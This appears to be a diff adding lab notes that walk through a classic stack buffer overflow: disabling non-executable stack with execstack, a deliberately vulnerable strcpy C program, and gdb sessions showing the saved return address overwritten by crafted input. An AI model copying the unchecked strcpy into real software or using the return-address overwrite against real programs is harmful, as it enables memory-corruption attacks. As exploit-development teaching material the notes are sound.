@@ -1,0 +1,98 @@
+# execstack ./strcpy
+
+	X ./strcpy
+
+# execstack --set-execstack ./strcpy
+
+
+# ./strcpy AAAA
+
+	buffer: ffffdc40 
+
+# gdb ./strcpy 
+
+(gdb) list
+
+	1	#pragma check_stack(off)
+	2	
+	3	#include <string.h>
+	4	 
+	5	int main(int argc, char *argv[]) {
+	6	        
+	7	    boom(argv[1]);
+	8	    return 0;
+	9	        
+	10	}
+	11	
+	12	void boom(char *str) {
+	13		
+	14	    char buffer[128];
+	15	    printf("buffer: %08x \n", &buffer);
+	16	    strcpy(buffer, str);  // The horror…
+	17	    
+	18	}
+
+(gdb) break 17
+
+(gdb) r $(python -c 'print "A" * 128')
+
+(gdb) backtrace
+
+	#0  boom (str=0x7fffffffe0fb 'A' <repeats 128 times>) at strcpy.c:18
+	#1  0x0000000000401085 in main (argc=0, argv=0x7fffffffdc00) at strcpy.c:7
+
+(gdb) info frame 0
+
+	Stack frame at 0x7fffffffdc00:
+	 rip = 0x4010ca in boom (strcpy.c:18); saved rip = 0x401085
+	 called by frame at 0x7fffffffdc10
+	 source language c.
+	 Arglist at 0x7fffffffdbf0, args: str=0x7fffffffe0fb 'A' <repeats 128 times>
+	 Locals at 0x7fffffffdbf0, Previous frame's sp is 0x7fffffffdc00
+	 Saved registers:
+	  rbp at 0x7fffffffdbf0, rip at 0x7fffffffdbf8
+
+(gdb) x/40x buffer
+
+	0x7fffffffdb70:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdb80:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdb90:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdba0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdbb0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdbc0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdbd0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdbe0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdbf0:	0xffffdc00	0x00007fff	0x00401085	0x00000000
+	0x7fffffffdc00:	0xffffdcf8	0x00007fff	0x00401740	0x00000002
+
+(gdb) run
+
+
+(gdb) r $(python -c 'print ("A" * 128 + "BBBBBBBB" + "12345678")')
+
+(gdb) info frame 0
+
+	Stack frame at 0x7fffffffdbf0:
+	 rip = 0x4010ca in boom (strcpy.c:18); saved rip = 0x3837363534333231
+	 called by frame at 0x7fffffffdbf8
+	 source language c.
+	 Arglist at 0x7fffffffdbe0, args: str=0x7fffffffe0eb 'A' <repeats 128 times>, "BBBBBBBB12345678"
+	 Locals at 0x7fffffffdbe0, Previous frame's sp is 0x7fffffffdbf0
+	 Saved registers:
+	  rbp at 0x7fffffffdbe0, rip at 0x7fffffffdbe8
+  
+(gdb) x/40x buffer
+
+	0x7fffffffdb60:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdb70:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdb80:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdb90:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdba0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdbb0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdbc0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdbd0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffdbe0:	0x42424242	0x42424242	0x34333231	0x38373635
+	0x7fffffffdbf0:	0xffffdc00	0x00007fff	0x00401740	0x00000002
+
+
+(gdb) r $(python ./youwin.py)
